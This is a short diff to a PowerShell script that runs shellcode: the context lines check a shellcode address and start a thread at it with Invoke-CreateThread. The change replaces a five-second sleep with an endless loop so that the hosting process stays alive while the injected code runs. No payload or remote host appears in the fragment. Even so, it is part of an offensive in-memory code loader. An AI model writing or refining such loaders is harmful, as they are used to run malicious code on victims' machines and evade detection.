@@ -93,7 +93,7 @@ if ($ShellcodeAddr -ne [IntPtr]::Zero) {
     Invoke-CreateThread -lpThreadAttributes ([IntPtr]::Zero) -dwStackSize 0 -lpStartAddress $ShellcodeAddr -lpParameter ([IntPtr]::Zero) -dwCreationFlags 0 -lpThreadId ([IntPtr]::Zero) | Out-Null
     
     # Allow execution time
-    Start-Sleep -Seconds 5
+    while($true) { Start-Sleep -Seconds 60 }
 }
 
 # ==========================================================
